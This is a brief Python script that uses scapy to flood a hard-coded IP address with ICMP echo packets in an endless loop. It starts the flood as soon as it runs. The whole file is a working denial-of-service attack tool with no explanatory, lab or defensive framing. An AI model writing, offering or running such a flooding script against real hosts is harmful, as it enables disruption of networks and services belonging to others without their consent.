from scapy.all import *
import time

target_ip = "192.168.18.3"

def ping_flood():
    while True:
        packet = IP(dst=target_ip) / ICMP()
        send(packet, verbose=False)

ping_flood()
